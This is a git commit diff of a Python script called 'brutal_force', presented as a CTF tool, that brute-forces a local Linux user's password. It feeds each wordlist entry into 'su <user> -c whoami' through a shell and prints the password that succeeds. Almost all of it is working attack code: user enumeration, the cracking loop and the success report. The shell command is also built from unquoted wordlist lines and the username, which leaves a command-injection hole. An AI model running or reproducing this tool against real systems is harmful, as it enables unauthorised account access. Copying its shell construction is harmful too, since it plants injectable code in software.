e865c04af624679ea6d6c54a4ac5c20c47650cea
0xSpectral <phoenixrojo7@gmail.com>
2026-01-14 14:40:37 +0100

    Update brutal_force_v1.py

--- brutal_force_v1/brutal_force_v1.py
+++ brutal_force_v1/brutal_force_v1.py
@@ -1,20 +1,23 @@
-#!usr/bin/env python3
 
-import argparse
-import sys
-import subprocess
-import sys
 import signal
+import sys
+import time
+import platform
+import argparse
+import pwd
+import subprocess
+import os
 
 #COLORS
 RESET = "\033[0m"
 BOLD  = "\033[1m"  
 GREEN = "\033[38;5;46m"
 RED = "\033[38;5;196m"
-
+YELLOW = "\033[38;5;226m"
 
 def print_banner():
     banner = f"""{GREEN}{BOLD}
+    
         ██████╗ ██████╗ ██╗   ██╗████████╗ █████╗ ██╗         ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
         ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔══██╗██║         ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
         ██████╔╝██████╔╝██║   ██║   ██║   ███████║██║         █████╗  ██║   ██║██████╔╝██║      █████╗  
@@ -27,77 +30,109 @@ def print_banner():
 """
     print(banner)
 
-def parse_args():
-    parser = argparse.ArgumentParser(description="CTF tool for authorized brute force testing against a Linux user",
-                                     prog="brutal-force",
-                                     epilog="Diseñada por 0xSpectral | uso exclusivo en CTF",
-                                     add_help=True,
-                                     formatter_class=argparse.RawDescriptionHelpFormatter)
-    parser.add_argument("-u", "--user", help="usuario objetivo", required=True)
-    parser.add_argument("-w","--wordlist", help="diccionario a utilizar", required=True)
-    return parser.parse_args()
-
-def exit_failure(string):
-        print(f"{RED}{BOLD}[!] {string} is needed exiting in: {RESET}")
-        print(f"{RED}{BOLD}[-] Script finished with failure{RESET}")
-        sys.exit(1)
-
 def ctrl_c(sig,frame):
-    print(f"\n{RED}{BOLD}[!] Script Abortado, salida no exitosa{RESET}")
+    print(f"{RED}{BOLD}\n[!] Script abortado, procediendo a salida no existosa{RESET}")
     sys.exit(1)
-    
-def executor(cmd):
-    if not cmd or cmd == '':
-        exit_failure("command")
-    result = subprocess.run(cmd,shell=True,text=True, capture_output=True)
-    return result.returncode
 
+def execute_trap():
+    signal.signal(signal.SIGINT, ctrl_c)
 
-def progress_bar(current, total, width=40):
-    if total <= 0:
-        return
-
-    filled = int(width * current / total)
-    bar = f"{GREEN}{BOLD}" + ("█" * filled) + "-" * (width - filled)
-    
-    sys.stdout.write(f"{GREEN}{BOLD}\r[{bar}] {current}/{total}{RESET}")
-    sys.stdout.flush()
-
-    if current >= total:
-        sys.stdout.write("\n")
-    
-def brute_forcer(user, wordlist):
-    if not user or not wordlist:
-        exit_failure("user and wordlist")
-    with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
-        total = sum(1 for _ in f)
-        print(f"{GREEN}{BOLD}\n[+] Vulnerando el login del usuario: {user} ....{RESET}")
-        print(f"{GREEN}{BOLD}[+] Realizando el ataque de fuerza bruta utilizando el diccionario: {wordlist} ....{RESET}")
-    with open(wordlist, "r", encoding="latin-1") as f:
-        for i,line in enumerate(f,start=1):  
-            progress_bar(i,total,width=40)
-            line = line.strip()
-            return_code = executor(f"echo {line} | timeout 0.1 bash -c 'su {user} -c whoami &>/dev/null'")
-            if(return_code == 0):
-                print(f"{GREEN}{BOLD}\n\n[+] Contraseña encontrada para el usuario {user}: {line}{RESET}")
-                sys.exit(0)  
-        print(f"{RED}{BOLD}\n[-] No se ha podido encontrar la contraseña para el usuario: {user}{RESET}")
-        still_searching(user)
+def operative_system_detection():
+    if platform.system() == "Linux":
+        print(f"{GREEN}{BOLD}[+] Sistema Linux detectado, se puede continuar con el script{RESET}")
+        time.sleep(2)
+    if platform.system() == "Windows":
+        print(f"{RED}{BOLD}[-] Sistema Windows detectado, no se puede continuar con el script{RESET}")
+        sys.exit(1)
+    if platform.system() == "Darwin":
+        print(f"{RED}{BOLD}[-] Sistema MAC detectado, no se puede continuar con el script{RESET}")
         sys.exit(1)
         
-def still_searching(user):
-    answer = input(f"{RED}{BOLD}\n[?] Quieres cargar otro diccionario? [S/N]: {RESET}")
-    if(answer.lower() == 's'):
-        wordlist = input(f"{GREEN}{BOLD}\n[+] De acuerdo, proporciona la ruta de otro diccionario: {RESET}")
-        brute_forcer(user, wordlist)
-    else:
-        sys.exit(0)
-            
-def main():
-    signal.signal(signal.SIGINT, ctrl_c)
-    print_banner()
-    args = parse_args()
-    brute_forcer(args.user, args.wordlist)  
+def obtain_args():
+    parser = argparse.ArgumentParser(
+        prog="brutal_force.py",
+        description="Herramienta destinada a realizar ataques de fuerza bruta contra login de usuarios en Linux",
+        epilog="No utilizar esta herramienta fuera de CTFs o entornos controlados",
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    
+    parser.add_argument("-u","--user", help="Usuario a vulnerar", required=True)
+    parser.add_argument("-w", "--wordlist", help="Diccionario a utilizar", required=True)
+    
+    return parser.parse_args()
 
+def progress_bar(current, total, width=40):
+    filled = int(current*width/total)
+    bar =(f"{GREEN}{BOLD}" + "█" * filled + "-" * (width - filled))
+    
+    sys.stdout.write(f"{GREEN}{BOLD}\r[{bar}] {YELLOW}{BOLD}Lineas: {current}/{total} Progreso: [{current/total*100:.6f}%]{RESET}")  
+    
+    if current >= total:
+       sys.stdout.write("\n")      
+
+def get_valid_users():
+    users = []
+    for user in pwd.getpwall():
+        if user.pw_uid >= 1000 and user.pw_shell not in ("/usr/sbin/nologin","/bin/false"):
+            users.append(user.pw_name)
+    return users
+
+def executor(cmd):
+    if not cmd:
+        print(f"No se ha proporcionado un comando")
+    result = subprocess.run(cmd, shell=True, text=True, capture_output=True)
+    return result.returncode
+
+def search_again(user):
+    answer = input(f"{RED}{BOLD}\n[?] ¿Quieres utilizar otro diccionario? [S/N] ")
+    if answer.lower() == 's':
+        wordlist = input(f"{GREEN}{BOLD}\n[+] Proporciona una nueva ruta para el diccionario: {RESET}")
+        if os.path.exists(wordlist):
+            brute_forcer(user, wordlist)
+        else:
+            print(f"{RED}{BOLD}\n[-] No existe ese diccionario en este equipo{RESET}")
+            sys.exit(1)
+    else:
+        sys.exit(1)
+
+def brute_forcer(user, wordlist):
+    if not user or not wordlist:
+        print("No se han proporcionado los argumentos necesarios")
+        sys.exit(1)
+    users = get_valid_users()
+    if user not in users:
+        print(f"{RED}{BOLD}\n[-] No se ha proporcionado un usuario válido{RESET}")
+        sys.exit(1)
+    if not os.path.exists(wordlist):
+        print(f"{RED}{BOLD}\n[-] No se ha proporcionado una ruta válida de diccionario{RESET}")
+        sys.exit(1)
+    with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
+        total = sum(1 for _ in f)
+        if total == 0:
+            print(f"{RED}{BOLD}\n[-] El archivo proporcionado está vacío{RESET}")
+    print(f"{GREEN}{BOLD}\n[+] El archivo proporcionado tiene un total de {total} líneas{RESET}")
+    time.sleep(2)
+    print(f"{GREEN}{BOLD}\n[+] Vulnerando el login de {user} utilizando el diccionario {wordlist}{RESET}\n")
+    
+    with open(wordlist, "r", encoding="latin-1") as f:
+        for i,line in enumerate(f, start=1):
+            password = line.strip()
+            command = f"echo {password} | timeout 0.2 bash -c 'su {user} -c whoami &>/dev/null'"
+            progress_bar(i,total,width=40)
+            code = executor(command)
+            if code == 0:
+                print(f"{GREEN}{BOLD}\n\n[+] La contraseña para el usuario: {user} es: {password}{RESET}")
+                sys.exit(0)
+        print(f"{RED}{BOLD}\n[-] No se ha podido encontrar la contraseña para el usuario {user}{RESET}")
+    search_again(user)
+        
+def main():
+    print_banner()
+    execute_trap()
+    operative_system_detection()
+    args = obtain_args()
+    brute_forcer(args.user,args.wordlist)
+    
+    
 if __name__ == '__main__':
     main()
